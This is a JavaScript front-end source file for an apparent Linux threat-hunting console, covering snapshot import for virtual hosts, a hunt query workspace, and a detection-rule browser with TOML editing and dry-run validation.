    if (hostFrom === "segment") {
      out.parent_dir_field = Number(fd.get("parent_dir_field") || 4) || 4;
    } else if (hostFrom === "pulsesecure") {
      const field = Number(fd.get("parent_dir_field") || 0);
      if (field > 0) out.parent_dir_field = field;
    }
    const treeEl = document.getElementById(`${idPrefix}TreeImport`);
    if (treeEl) out.tree_import = !!treeEl.checked;
    return out;
  }

  function wireTreeHostFromFields(idPrefix = "virtTree", displayNameSel = null) {
    const hostFromSel = $(`#${idPrefix}HostFrom`);
    const segFields = $(`#${idPrefix}SegmentFields`);
    const treeToggle = $(`#${idPrefix}TreeImport`);
    const displayWrap = displayNameSel
      ? (typeof displayNameSel === "string" ? $(displayNameSel) : displayNameSel)
      : null;
    const sync = () => {
      const mode = hostFromSel?.value || "dirname";
      if (segFields) segFields.style.display = mode === "segment" ? "grid" : "none";
      const treeOn = !treeToggle || !!treeToggle.checked;
      if (displayWrap) {
        displayWrap.classList.toggle("hidden", treeOn);
        displayWrap.querySelectorAll("input").forEach((el) => {
          el.required = !treeOn;
          if (treeOn) el.value = "";
        });
      }
      // Refresh match preview if a folder is already selected.
      document.dispatchEvent(new CustomEvent("rustmite:virt-tree-opts", { detail: { idPrefix } }));
    };
    hostFromSel?.addEventListener("change", sync);
    treeToggle?.addEventListener("change", sync);
    $(`#${idPrefix}SegmentFields`)?.querySelectorAll("input")?.forEach((el) => {
      el.addEventListener("input", sync);
    });
    sync();
  }

  /**
   * Upload a day folder: one virtual host per top-level subdirectory.
   * Large hosts are chunked; progress reports host i/N.
   */
  async function importVirtualTreeUpload(files, opts, onProgress) {
    const { byDir, root } = groupVirtualFilesByTopDir(files);
    if (!byDir.size) {
      throw new Error("No subdirectories found in the folder upload");
    }
    if (root.length) {
      toast(`Ignoring ${root.length} file(s) at folder root (not under a host dir)`);
    }
    const dirs = [...byDir.keys()].sort();
    const results = [];
    let hostsOk = 0;
    let hostsFailed = 0;
    let hostsSkipped = 0;
    for (let i = 0; i < dirs.length; i++) {
      const dirname = dirs[i];
      const hostFiles = byDir.get(dirname) || [];
      onProgress?.({
        phase: "upload",
        detail: `Host ${i + 1}/${dirs.length}: ${dirname} (${hostFiles.length} file(s))…`,
        pct: Math.round((i / dirs.length) * 100),
      });
      const chunks = chunkVirtualUploadFiles(hostFiles);
      try {
        const first = await postVirtualImportBody(
          "/v1/hosts/virtual/import-tree-upload",
          {
            host_from: opts.host_from || "dirname",
            parent_dir_field: opts.parent_dir_field,
            delimiter: opts.delimiter || "-",
            replace: opts.replace !== false,
            create_scan: chunks.length === 1 && opts.create_scan !== false,
            kind: opts.kind || "auto",
            virtual_agent_id: opts.virtual_agent_id || null,
            source_label: opts.source_label || null,
            files: chunks[0],
          },
          (p) => onProgress?.({
            ...p,
            detail: `Host ${i + 1}/${dirs.length} · ${p.detail || dirname}`,
          })
        );
        const row = first.summary?.results?.[0];
        const hostId = row?.host_id;
        let processes = row?.processes || 0;
        let filesCount = row?.files || 0;
        let scanId = row?.scan_id || null;
        if (hostId && chunks.length > 1) {
          for (let c = 1; c < chunks.length; c++) {
            const isLast = c === chunks.length - 1;
            const res = await postVirtualImportBody(
              `/v1/hosts/${encodeURIComponent(hostId)}/ingest/import`,
              {
                path: null,
                recursive: true,
                kind: opts.kind || "auto",
                files: chunks[c].map((f) => ({
                  name: String(f.name).includes("/")
                    ? String(f.name).slice(String(f.name).indexOf("/") + 1)
                    : f.name,
                  content: f.content,
                })),
                replace: false,
                create_scan: isLast && opts.create_scan !== false,
                virtual_agent_id: opts.virtual_agent_id || null,
              },
              (p) => onProgress?.({
                ...p,
                detail: `Host ${i + 1}/${dirs.length} batch ${c + 1}/${chunks.length}: ${p.detail || ""}`,
              })
            );
            processes += res.summary?.processes_appended || 0;
            filesCount += res.summary?.files_appended || 0;
            if (res.scan_id) scanId = res.scan_id;
          }
        }
        if (row?.error) {
          hostsSkipped += 1;
          results.push(row);
        } else if (hostId && hostId !== "00000000-0000-0000-0000-000000000000") {
          hostsOk += 1;
          results.push({
            ...(row || { dir: dirname, display_name: dirname }),
            processes,
            files: filesCount,
            scan_id: scanId,
          });
        } else {
          hostsFailed += 1;
          results.push({
            dir: dirname,
            display_name: dirname,
            error: "server returned no host id",
          });
        }
      } catch (err) {
        hostsFailed += 1;
        results.push({
          dir: dirname,
          display_name: dirname,
          error: err.message || String(err),
        });
      }
    }
    return {
      ok: hostsFailed === 0,
      summary: {
        root: "upload",
        hosts_ok: hostsOk,
        hosts_failed: hostsFailed,
        hosts_skipped: hostsSkipped,
        results,
      },
    };
  }

  async function importVirtualFeed(hostId, feed) {
    return importVirtualFeedChunked(hostId, {
      path: feed.path || null,
      recursive: !!feed.recursive,
      kind: feed.kind || "auto",
      files: feed.files || [],
      replace: true,
      create_scan: true,
    });
  }

  function showFeedVirtualHost(hostId, displayName) {
    const host = state.hosts.find((h) => h.id === hostId);
    const currentProfile = host?.labels?.virtual_agent
      || state._vaProfileId
      || state.virtualAgents?.[0]?.id
      || "";
    openDrawer(`Update · ${esc(displayName || hostId)}`, `
      <form class="form" id="feedVirtualForm">
        <p class="muted" style="font-size:0.82rem;margin:0 0 0.75rem">
          Provide a new JSONL/JSON/CSV snapshot (or a server-local path). Each import
          <strong>adds a new scan</strong> under Scans (previous imports stay in history).
          Current inventory is refreshed for Fleet Sift. The selected profile controls field mapping.
        </p>
        <label>Virtual agent profile
          <select name="virtual_agent_id" id="feedVirtualAgentId">
            ${virtualAgentOptionsHtml(currentProfile)}
          </select>
        </label>
        <label>Kind
          <select name="kind">
            <option value="auto">Auto (sniff)</option>
            <option value="processes">Processes</option>
            <option value="files">Files</option>
          </select>
        </label>
        <label>Server path (file or directory)
          <input name="path" class="mono" placeholder="/var/log/fleet or ./samples/procs.jsonl" autocomplete="off" />
        </label>
        <label class="rules-enable" style="display:flex;gap:0.5rem;align-items:center;margin:0.35rem 0">
          <input type="checkbox" name="recursive" checked />
          Recurse directories
        </label>
        <p class="muted" style="font-size:0.78rem;margin:0.25rem 0 0.55rem">
          Each import <strong>adds a new scan</strong> under Scans (previous imports stay in history). Current inventory is refreshed for Fleet Sift.
        </p>
        <label>Upload .jsonl / .json / .csv files
          <input type="file" id="feedVirtualFiles" multiple accept=".jsonl,.ndjson,.json,.csv,text/*" />
        </label>
        <label>Or upload a folder
          <input type="file" id="feedVirtualDir" webkitdirectory directory multiple />
        </label>
        <p id="feedVirtualPickStatus" class="muted" style="font-size:0.78rem;margin:0.4rem 0 0;min-height:1.2em"></p>
        <div class="form-actions">
          <button type="submit" class="btn primary">Import</button>
          <button type="button" class="btn ghost" data-close-drawer>Cancel</button>
        </div>
      </form>
      <div id="feedVirtualProgress" class="hidden"></div>
      <div id="feedVirtualResult" class="hidden" style="margin-top:1rem"></div>
    `);
    const form = $("#feedVirtualForm");
    wireVirtualUploadPickers("#feedVirtualFiles", "#feedVirtualDir", "#feedVirtualPickStatus");
    form?.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      const btn = form.querySelector('button[type="submit"]');
      if (btn) btn.disabled = true;
      const progWrap = $("#feedVirtualProgress");
      if (progWrap) {
        progWrap.classList.remove("hidden");
        progWrap.innerHTML = importProgressHtml("feedVirtualProgBar");
        progWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
      }
      const ticker = startImportProgressTicker("feedVirtualProgBar");
      try {
        setImportProgress("feedVirtualProgBar", {
          title: "Reading files",
          detail: "Scanning selected files…",
          pct: 0,
        });
        const feed = await readVirtualFeedFields(
          fd,
          "#feedVirtualFiles",
          "#feedVirtualDir",
          (p) => setImportProgress("feedVirtualProgBar", {
            title: p.phase === "scan" || p.phase === "scan_done" ? "Scanning folder" : "Reading files",
            detail: p.detail,
            pct: p.pct,
          })
        );
        if (!feed.path && !feed.files.length) {
          toast("Provide a server path or upload at least one file");
          ticker.stop();
          return;
        }
        setImportProgress("feedVirtualProgBar", {
          title: "Importing on server",
          detail: "Parsing JSONL (large mixed snapshots can take a minute)…",
          pct: null,
        });
        const res = await importVirtualFeedChunked(
          hostId,
          {
            path: feed.path || null,
            recursive: !!feed.recursive,
            kind: feed.kind || "auto",
            files: feed.files || [],
            replace: true,
            create_scan: true,
            virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
          },
          (p) => setImportProgress("feedVirtualProgBar", {
            title: p.phase === "pack" ? "Packaging upload" : "Uploading to server",
            detail: p.detail,
            pct: p.pct,
          })
        );
        ticker.stop();
        const s = res.summary || {};
        const scanNote = res.scan_id
          ? ` · scan ${String(res.scan_id).slice(0, 8)}`
          : (res.scan_error ? ` · scan not recorded: ${res.scan_error}` : "");
        setImportProgress("feedVirtualProgBar", {
          title: "Done",
          detail: `Processes +${s.processes_appended ?? 0} · files +${s.files_appended ?? 0} · skipped ${s.skipped ?? 0}${scanNote}`,
          done: true,
        });
        const box = $("#feedVirtualResult");
        if (box) {
          box.classList.remove("hidden");
          box.innerHTML = `
            <div class="panel" style="padding:0.75rem">
              <div><strong>Imported</strong> · ${esc(String(s.files_processed ?? 0))} file(s)${res.scan_id ? ` · scan <span class="mono">${esc(String(res.scan_id))}</span>` : ""}</div>
              <div class="muted" style="margin-top:0.35rem">
                processes +${esc(String(s.processes_appended ?? 0))} ·
                files +${esc(String(s.files_appended ?? 0))} ·
                skipped ${esc(String(s.skipped ?? 0))}
              </div>
              ${res.scan_error ? `<div style="margin-top:0.5rem;color:var(--warn,#b54708);font-size:0.82rem">${esc(res.scan_error)}</div>` : ""}
              ${(s.processes_appended || 0) === 0 ? `<div style="margin-top:0.5rem;color:var(--warn,#b54708);font-size:0.82rem">No process rows found — check Kind=Auto and that the JSONL includes <span class="mono">event_type:process</span>.</div>` : ""}
            </div>`;
        }
        toast(`Imported into ${displayName || hostId}`);
        try {
          await loadAll();
        } catch (_) {}
        const pane = $("#hostProcessesPane");
        if (pane && (s.processes_appended || 0) > 0) {
          loadHostProcesses(hostId, { virtual: true }).catch(() => {});
        }
      } catch (err) {
        ticker.stop();
        setImportProgress("feedVirtualProgBar", {
          title: "Failed",
          detail: err.message || String(err),
          done: true,
        });
        toast(err.message);
      } finally {
        if (btn) btn.disabled = false;
      }
    });
    $$("[data-close-drawer]").forEach((b) => b.addEventListener("click", () => closeDrawer()));
  }

  function hunt() {
    const tab = state._rplTab || "results";
    const q = state._rplQuery || 'host_name=* kind="process" | fields timestamp, host_name, process_name, process_id, user, path | sort -timestamp | head 50';
    const fields = state._rplFields || [];
    const saved = loadRplSaved();
    const history = loadRplHistory();
    const resRaw = state._rplResult;
    const res = filteredRplResult(resRaw);
    const hist = state._rplHist;
    const selected = state._rplSelected ?? 0;
    const panelViz = state._rplPanelViz || (res?.viz || "table");
    const sqlOpen = !!state._rplSqlOpen;
    const elapsed = state._rplElapsed;
    const searching = !!state._rplSearching;
    const hasSearched = !!resRaw;
    const preset = state._rplTimePreset || "";
    const filterVal = state._rplResultFilter || "";
    const filterRegex = !!state._rplResultFilterRegex;
    const histOpen = !!state._rplHistoryOpen;
    const hitCount = resRaw ? (resRaw.count ?? (resRaw.rows || []).length) : null;
    const filterMatch = res?._filterMatch;
    const filterTotal = res?._filterTotal;

    const statsBar = searching
      ? `<div class="search-stats-bar running" role="status">Executing query…</div>`
      : hasSearched
        ? `<div class="search-stats-bar" role="status">
            <span>Query complete</span>
            <span class="sep">·</span>
            <strong>${Number(hitCount || 0).toLocaleString()} hit${hitCount === 1 ? "" : "s"}</strong>
            ${elapsed != null ? `<span class="sep">·</span><span class="mono">${esc(String(elapsed))} ms</span>` : ""}
            <span class="sep">·</span><span class="muted">engine ${esc(resRaw?.engine || "—")}</span>
            ${resRaw?.hint ? `<span class="sep">·</span><span class="rpl-hint">${esc(resRaw.hint)}</span>` : ""}
          </div>`
        : `<div class="search-stats-bar idle" role="status">Enter a Hunt query and press <kbd>Ctrl</kbd>+<kbd>Enter</kbd> to run</div>`;

    return `
      <div class="search-workspace">
        <aside class="fields-panel panel">
          <div class="panel-head"><h3>Fields</h3></div>
          <div class="fields-panel-body">
            <input id="rplFieldFilter" type="search" placeholder="Filter fields…" value="${esc(state._rplFieldFilter || "")}" />
            <div class="rpl-field-list" id="rplFieldList">
              ${renderRplFieldListHtml(fields, state._rplFieldFilter || "")}
            </div>
            <div class="rpl-saved">
              <div class="rpl-saved-head">
                <strong>Saved queries</strong>
                <button type="button" class="btn ghost" id="rplSaveQuery" title="Save current query">Save</button>
              </div>
              ${saved.length
                ? saved.map((s, i) => `
                  <div class="rpl-saved-item">
                    <button type="button" class="rpl-saved-load" data-rpl-load="${i}">${esc(s.name || s.query.slice(0, 40))}</button>
                    <button type="button" class="icon-btn" data-rpl-del="${i}" aria-label="Delete">×</button>
                  </div>`).join("")
                : `<div class="muted" style="font-size:0.8rem">None yet — Save pins the current query here</div>`}
            </div>
          </div>
        </aside>

        <div class="search-workspace-main">
          <div class="rpl-tabs">
            <button type="button" class="rpl-tab ${tab === "results" ? "active" : ""}" data-rpl-tab="results">Results</button>
            <button type="button" class="rpl-tab ${tab === "guide" ? "active" : ""}" data-rpl-tab="guide">Guide</button>
            <button type="button" class="rpl-tab ${tab === "expr" ? "active" : ""}" data-rpl-tab="expr">Expr</button>
          </div>

          ${tab === "guide" ? `<section class="panel rpl-guide-panel">${renderRplGuideHtml()}</section>` : ""}

          ${tab === "expr" ? `
          <section class="panel">
            <div class="panel-head"><h3>Legacy expr hunt</h3><span class="muted">POST /v1/hunt</span></div>
            <div style="padding:1.1rem">
              <form class="form" id="huntForm">
                <label>Match stream
                  <select name="match_on">
                    <option>process</option><option>hidden_process</option><option>authorized_key</option>
                    <option>shadow_entry</option><option>integrity_mismatch</option><option>file_entropy</option>
                  </select>
                </label>
                <label>Where expression
                  <textarea name="where_expr">${esc(state._exprWhere || "process.exe_memfd == true")}</textarea>
                </label>
                <div class="form-actions">
                  <button class="btn ghost" type="submit">Run expr</button>
                </div>
              </form>
              <div id="huntResults" style="margin-top:1rem">${state._exprResultsHtml || ""}</div>
            </div>
          </section>` : ""}

          ${tab === "results" ? `
          <section class="panel rpl-results-panel">
            <form class="search-command-card" id="rplHuntForm">
              <div class="search-query-shell">
                <textarea name="query" id="rplQuery" spellcheck="false" placeholder='host_name="web-01" kind="process" | fields timestamp, process_name, process_id, user, path | head 200'>${esc(q)}</textarea>
                <div class="search-history-drop" id="rplHistoryDrop" ${histOpen ? "" : "hidden"}>
                  ${history.length
                    ? history.slice(0, 20).map((h, i) => `
                        <button type="button" class="search-history-item" data-rpl-hist="${i}">${esc(h.query)}</button>`).join("")
                    : `<div class="search-history-empty">No recent queries yet</div>`}
                  ${history.length ? `<button type="button" class="search-history-item" id="rplClearHistory" style="color:var(--crit)">Clear history</button>` : ""}
                </div>
              </div>
              <div class="search-query-bar">
                <div class="search-query-hints">
                  <span><kbd>Ctrl</kbd>+<kbd>Enter</kbd> run</span>
                  <span class="search-time-presets">
                    ${[
                      ["1h", "Last 1h"],
                      ["24h", "Last 24h"],
                      ["7d", "Last 7d"],
                      ["", "All time"],
                    ].map(([id, label]) => `
                      <button type="button" class="btn ghost ${preset === id ? "active" : ""}" data-rpl-preset="${id}">${label}</button>
                    `).join("")}
                  </span>
                </div>
                <div class="search-query-actions">
                  <button type="button" class="btn ghost search-history-toggle" id="rplHistoryToggle" title="Search history" aria-expanded="${histOpen}">
                    History
                    ${history.length ? `<span class="search-history-badge">${history.length}</span>` : ""}
                  </button>
                  <button class="btn ghost" type="button" id="rplCompile">Compile</button>
                  <button class="btn primary" type="submit" ${searching ? "disabled" : ""}>${searching ? "Running…" : "Run"}</button>
                </div>
              </div>
              <div class="search-controls-row">
                <label>From <input name="time_from" type="text" placeholder="ISO / -24h" value="${esc(state._rplTimeFrom || "")}" /></label>
                <label>To <input name="time_to" type="text" placeholder="ISO / now" value="${esc(state._rplTimeTo || "")}" /></label>
                <label>Limit <input name="limit" type="number" min="1" max="10000" value="${esc(String(state._rplLimit ?? 200))}" /></label>
              </div>
            </form>
            ${history.length ? `
            <div class="search-recent-strip" aria-label="Recent searches">
              <span class="label">Recent</span>
              ${history.slice(0, 4).map((h, i) => `
                <button type="button" class="btn ghost search-recent-chip" data-rpl-hist="${i}" title="${esc(h.query)}">${esc(h.query.length > 48 ? h.query.slice(0, 48) + "…" : h.query)}</button>
              `).join("")}
            </div>` : ""}
            <div class="rpl-examples">${renderRplExampleChips()}</div>
            ${statsBar}
            <div class="results-filter-bar">
              <div class="results-filter-input-wrap">
                <input id="rplResultFilter" type="search" placeholder="Filter results…" value="${esc(filterVal)}" spellcheck="false" />
                ${filterVal ? `<button type="button" class="results-filter-clear" id="rplResultFilterClear" aria-label="Clear">×</button>` : ""}
              </div>
              <button type="button" class="btn ${filterRegex ? "primary" : "ghost"}" id="rplResultFilterRegex" aria-pressed="${filterRegex}">Regex</button>
              ${filterVal && filterMatch != null && filterTotal != null
                ? `<span class="results-filter-count">${filterMatch.toLocaleString()} / ${filterTotal.toLocaleString()}</span>`
                : ""}
              ${res?._filterError ? `<span class="results-filter-error">${esc(res._filterError)}</span>` : ""}
              ${hasSearched ? `
                <button type="button" class="btn ghost" id="rplExportJson" title="Export filtered rows as JSON">JSON</button>
                <button type="button" class="btn ghost" id="rplExportCsv" title="Export filtered rows as CSV">CSV</button>
              ` : ""}
            </div>
            <div class="rpl-chart-panel">
              <div class="rpl-chart-head">
                <strong>Timeline</strong>
                <div class="rpl-viz-switch">
                  ${["table", "timechart", "bar", "single_value"].map((m) => `
                    <button type="button" class="btn ghost ${panelViz === m || (m === "bar" && panelViz === "stats") ? "active" : ""}" data-rpl-viz="${m}">${m === "single_value" ? "single" : m === "bar" ? "bar" : m}</button>
                  `).join("")}
                </div>
              </div>
              <div class="rpl-chart-body" id="rplChart">${renderRplTimeline(res, hist)}</div>
            </div>
            <div class="rpl-split">
              <div class="rpl-results" id="rplResults">${renderRplPanelBody(res, panelViz, selected)}</div>
              <div class="rpl-inspector-wrap" id="rplInspector">${renderRplInspector(res, selected)}</div>
            </div>
            <details class="rpl-sql" ${sqlOpen ? "open" : ""} id="rplSqlDetails">
              <summary>SQL preview</summary>
              <pre class="json mono" id="rplSql">${esc(resRaw?.sql || hist?.sql || "(run or compile a query)")}</pre>
            </details>
          </section>` : ""}
        </div>
      </div>`;
  }

  function checks() {
    const rows = state.checks || [];
    const selectedId = state.selectedCheckId || null;
    const detail = state.checkDetail && state.checkDetail.id === selectedId ? state.checkDetail : null;
    const types = [...new Set(rows.map((c) => c.check_type || c.type || "other"))].sort();
    const typeFilter = state.checkTypeFilter || "";
    const sevFilter = state.checkSevFilter || "";
    const enFilter = state.checkEnabledFilter || "";
    const q = (state.checkQuery || "").toLowerCase();

    const filtered = rows.filter((c) => {
      if (typeFilter && (c.check_type || c.type) !== typeFilter) return false;
      if (sevFilter && String(c.severity) !== sevFilter) return false;
      if (enFilter === "on" && !c.enabled) return false;
      if (enFilter === "off" && c.enabled) return false;
      if (!q) return true;
      const hay = `${c.id} ${c.name} ${c.title || ""} ${c.rationale || ""} ${(c.attack || []).join(" ")}`.toLowerCase();
      return hay.includes(q);
    });

    const SCAN_SET_META = [
      { id: "pulse", title: "Pulse" },
      { id: "standard", title: "Standard" },
      { id: "deep", title: "Deep" },
      { id: "incident", title: "Incident" },
    ];

    const detailHtml = !selectedId
      ? `<div class="rules-empty">
          <h3>Select a rule</h3>
          <p class="muted">Browse the catalog like <a href="https://docs.sandflysecurity.com/docs/sandflies" target="_blank" rel="noopener">Sandfly sandflies</a> — open any rule to edit TOML, validate, dry-run test, and toggle scan profiles. Or create a new rule.</p>
          <button type="button" class="btn primary" id="btnNewRuleEmpty" style="margin-top:0.75rem">New rule</button>
        </div>`
      : !detail
        ? `<div class="rules-empty"><p class="muted">Loading ${esc(selectedId)}…</p></div>`
        : (() => {
            const scanSets = detail.scan_sets || {};
            return `
          <div class="rules-detail-head">
            <div>
              <div class="rules-detail-id mono">${esc(detail.id)}</div>
              <h3>${esc(detail.name)}</h3>
              <p class="muted" style="margin:0.35rem 0 0">${esc(detail.title || "")}</p>
            </div>
            <div class="rules-detail-actions">
                <label class="rules-enable">
                  <input type="checkbox" id="ruleEnabled" ${detail.enabled ? "checked" : ""} />
                  Enabled
                </label>
                <button type="button" class="btn ghost" id="btnValidateRule" title="Compile + dry-run over recent observations">Validate</button>
                <button type="button" class="btn ghost" id="btnTestRule" title="Dry-run test (Mobipwn-style)">Test</button>
                <button type="button" class="btn ghost" id="btnReloadRule">Reload file</button>
                <button type="button" class="btn primary" id="btnSaveRule">Save TOML</button>
                <button type="button" class="btn ghost danger-text" id="btnDeleteRule" title="Delete this rule from disk">Delete</button>
              </div>
            </div>
            <div class="rules-meta">
              <span class="pill">${esc(detail.check_type)}</span>
              ${sev(detail.severity)}
              <span class="tag">${esc(detail.confidence || "")}</span>
              <span class="tag">cost ${esc(detail.cost || "")}</span>
              <span class="tag">v${esc(String(detail.version ?? ""))}</span>
              <span class="tag mono">match ${esc(detail.match_on || "")}</span>
            </div>
            ${detail.rationale ? `<p class="rules-rationale">${esc(detail.rationale)}</p>` : ""}
            ${(detail.attack || []).length ? `<div class="rules-attack">${(detail.attack || []).map((a) => `<span class="tag">${esc(a)}</span>`).join("")}</div>` : ""}
            <div class="rules-scan-toggles">
              <div class="rules-section-label">Active in scan profiles</div>
              <div class="rules-scan-grid">
                ${SCAN_SET_META.map((s) => `
                  <label class="rules-scan-chip ${scanSets[s.id] ? "on" : ""}">
                    <input type="checkbox" data-scan-set="${esc(s.id)}" ${scanSets[s.id] ? "checked" : ""} />
                    ${esc(s.title)}
                  </label>
                `).join("")}
              </div>
              <p class="muted" style="margin:0.45rem 0 0;font-size:0.75rem">These map to Pulse / Standard / Deep / Incident scan leases.${detail.is_anomark ? " AnoMark runs after a successful scan when Enabled and included in the profile used for that scan." : ""}</p>
            </div>
            ${detail.is_anomark ? `
            <div class="rules-anomark-panel">
              <div class="rules-section-label">AnoMark post-scan</div>
              <p class="muted" style="font-size:0.82rem;margin:0 0 0.55rem">Scores process inventories after scans. Enable the rule and toggle scan profiles above. Changes apply to the TOML when you click Apply → Save TOML.</p>
              <div class="ml-form-grid" id="ruleAnoMarkForm">
                <label>Trained model
                  <select id="ruleAnomarkModel">
                    <option value="">Platform default</option>
                    ${(state._anomarkModels || []).map((m) => `<option value="${esc(m.id)}" ${(detail.anomark?.model_id || "") === m.id ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
                  </select>
                </label>
                <label>Suspect percentile
                  <input id="ruleAnomarkSuspect" type="number" min="55" max="99.9" step="0.1" value="${esc(String(detail.anomark?.suspect_percent ?? 95))}" />
                </label>
                <label>Host tags <span class="muted">(all must match; empty = any)</span>
                  <input id="ruleAnomarkTags" type="text" value="${esc((detail.anomark?.tags || []).join(", "))}" placeholder="prod, linux" list="ruleAnomarkTagList" />
                  <datalist id="ruleAnomarkTagList">${(typeof siftKnownTags === "function" ? siftKnownTags() : []).map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
                </label>
                <label>Max commands / host
                  <input id="ruleAnomarkMax" type="number" min="100" max="100000" step="100" value="${esc(String(detail.anomark?.max_commands ?? 5000))}" />
                </label>
              </div>
              <div class="toolbar" style="margin-top:0.55rem">
                <button type="button" class="btn ghost" id="btnApplyAnoMarkRule">Apply to TOML editor</button>
              </div>
            </div>` : ""}
            ${detail.is_anomark ? "" : `<div class="rules-section-label">Where expression</div>
            <pre class="rules-code" id="ruleWherePreview">${highlightWhere(detail.where_expr || "")}</pre>`}
            <div class="rules-section-label">Rule source (TOML)</div>
            <div class="rules-editor-wrap">
              <textarea id="ruleTomlEditor" class="rules-editor" spellcheck="false">${esc(detail.toml || "")}</textarea>
              <pre class="rules-code rules-editor-hl" id="ruleTomlHighlight" aria-hidden="true">${highlightToml(detail.toml || "")}</pre>
            </div>
            <p class="muted mono" style="font-size:0.72rem;margin:0.4rem 0 0">${esc(detail.path || "")}</p>
            <div id="ruleSandbox" class="rules-sandbox ${state._ruleSandbox ? "" : "hidden"}">
              ${ruleSandboxHtml(state._ruleSandbox)}
            </div>
          `;
            })();

    return `<section class="rules-browser">
      <div class="rules-list-pane">
        <div class="rules-toolbar">
          <input id="checkQ" placeholder="Filter rules…" value="${esc(state.checkQuery || "")}" />
          <select id="checkTypeFilter">
            <option value="">All types</option>
            ${types.map((t) => `<option value="${esc(t)}" ${typeFilter === t ? "selected" : ""}>${esc(t)}</option>`).join("")}
          </select>
          <select id="checkSevFilter">
            <option value="">All severities</option>
            ${["critical","high","medium","low","info"].map((s) => `<option value="${s}" ${sevFilter === s ? "selected" : ""}>${s}</option>`).join("")}
          </select>
          <select id="checkEnabledFilter">
            <option value="" ${enFilter === "" ? "selected" : ""}>All</option>
            <option value="on" ${enFilter === "on" ? "selected" : ""}>Enabled</option>
            <option value="off" ${enFilter === "off" ? "selected" : ""}>Disabled</option>
          </select>
          <button type="button" class="btn ghost" id="btnReloadChecks" title="Reload catalog from disk">Reload</button>
          <button type="button" class="btn primary" id="btnNewRule" title="Create a new detection rule">New rule</button>
        </div>
        <div class="rules-count muted">${filtered.length} of ${rows.length} rules</div>
        <div class="rules-list" id="rulesList">
          ${filtered.map((c) => {
            const active = c.id === selectedId ? "active" : "";
            const sets = c.scan_sets || {};
            const setBits = ["pulse","standard","deep","incident"].filter((s) => sets[s]).map((s) => s[0].toUpperCase()).join("");
            return `<button type="button" class="rules-row ${active} ${c.enabled ? "" : "disabled"}" data-rule-id="${esc(c.id)}">
              <div class="rules-row-top">
                <span class="pill">${esc(c.id)}</span>
                ${sev(c.severity)}
                ${c.enabled ? "" : `<span class="tag">off</span>`}
              </div>
              <div class="rules-row-name">${esc(c.name)}</div>
              <div class="rules-row-meta muted">
                <span>${esc(c.check_type || c.type || "")}</span>
                ${setBits ? `<span class="mono">${esc(setBits)}</span>` : `<span class="mono">—</span>`}
              </div>
            </button>`;
          }).join("") || `<div class="empty">No matching rules</div>`}
        </div>
      </div>
      <div class="rules-detail-pane" id="rulesDetail">${detailHtml}</div>
    </section>`;
  }

  function ruleSandboxHtml(result) {
    if (!result) return "";
    if (result.error) {
      return `<div class="rules-section-label">Rule sandbox</div>
        <div class="rules-sandbox-err">${esc(result.error)}</div>`;
    }
    const dry = result.dry_run || {};
    const compile = result.compile || {};
    const sample = dry.sample || [];
    return `
      <div class="rules-section-label">Rule sandbox <span class="muted">${esc(result.mode || result.source || "validate")}</span></div>
      <div class="stats" style="margin:0.5rem 0 0.75rem">
        <div class="stat"><div class="label">Observations</div><div class="value">${esc(String(dry.observations_scanned ?? 0))}</div></div>
        <div class="stat ${Number(dry.hit_count) > 0 ? "crit" : ""}"><div class="label">Hits</div><div class="value">${esc(String(dry.hit_count ?? 0))}</div></div>
        <div class="stat"><div class="label">Elapsed</div><div class="value">${esc(String(dry.elapsed_ms ?? 0))}ms</div></div>
        <div class="stat"><div class="label">Match</div><div class="value mono" style="font-size:0.85rem">${esc(compile.match_on || "—")}</div></div>
      </div>
      ${!sample.length
        ? `<div class="empty" style="padding:0.75rem">No hits on scanned observations (dry-run — no findings created).</div>`
        : `<table class="data"><thead><tr><th>Severity</th><th>Title</th><th>Evidence</th></tr></thead><tbody>
            ${sample.map((h) => `<tr>
              <td>${sev(String(h.severity || "info").toLowerCase())}</td>
              <td>${esc(h.title || h.check_id || "—")}</td>
              <td class="mono muted" style="font-size:0.75rem;max-width:18rem;overflow:hidden;text-overflow:ellipsis">${esc(JSON.stringify(h.evidence || {}).slice(0, 160))}</td>
            </tr>`).join("")}
          </tbody></table>`}
      <p class="muted" style="margin:0.5rem 0 0;font-size:0.75rem">
        Compile + dry-run against stored observations (Mobipwn-style validate / test). Does not create findings — run a host scan to persist.
      </p>`;
  }

  function highlightToml(src) {
    const s = String(src || "");
    // Escape first, then decorate.
    let out = esc(s);
    out = out.replace(/(^|\n)(#[^\n]*)/g, "$1<span class=\"tok-comment\">$2</span>");
    out = out.replace(/(&quot;|&apos;)(?:(?!\1).)*\1/g, (m) => `<span class="tok-string">${m}</span>`);
    out = out.replace(/\b(true|false)\b/g, `<span class="tok-bool">$1</span>`);
    out = out.replace(/^(\s*)([A-Za-z_][\w-]*)(\s*=)/gm, `$1<span class="tok-key">$2</span>$3`);
    out = out.replace(/\b(id|version|name|type|severity|confidence|enabled|cost|match|where|title|evidence_fields|attack|rationale|collectors|false_positives|references)\b/g,
      `<span class="tok-key">$1</span>`);
    return out;
  }

  function highlightWhere(src) {
    let out = esc(String(src || ""));
    out = out.replace(/\b(and|or|not|matches|starts_with|ends_with|contains|null|true|false)\b/g,
      `<span class="tok-kw">$1</span>`);
    out = out.replace(/(&quot;|&apos;)(?:(?!\1).)*\1/g, (m) => `<span class="tok-string">${m}</span>`);
    out = out.replace(/\b(\d+)\b/g, `<span class="tok-num">$1</span>`);
    out = out.replace(/\b([a-z_][\w]*)\.(?=[a-z_])/g, `<span class="tok-ns">$1</span>.`);
    return out;
  }

  async function selectRule(id, opts) {
    if (!id) {
      state.selectedCheckId = null;
      state.checkDetail = null;
      state._ruleSandbox = null;
      if (!opts || !opts.skipHash) {
        const next = `#/checks`;
        if (location.hash !== next) history.replaceState(null, "", next);
      }
      render();
      return;
    }
    state.selectedCheckId = id;
    state._ruleSandbox = null;
    if (!opts || !opts.skipHash) {
      const next = `#/checks/${encodeURIComponent(id)}`;
      if (location.hash !== next) history.replaceState(null, "", next);
    }
    render();
    try {
      state.checkDetail = await api(`/v1/checks/${encodeURIComponent(id)}`);
      if (state.checkDetail?.is_anomark && !(state._anomarkModels || []).length) {
        await refreshAnoMark().catch(() => {});
      }
      if (state.view === "checks") render();
    } catch (e) {
      toast(e.message || String(e));
    }
  }

  async function refreshChecksCatalog() {
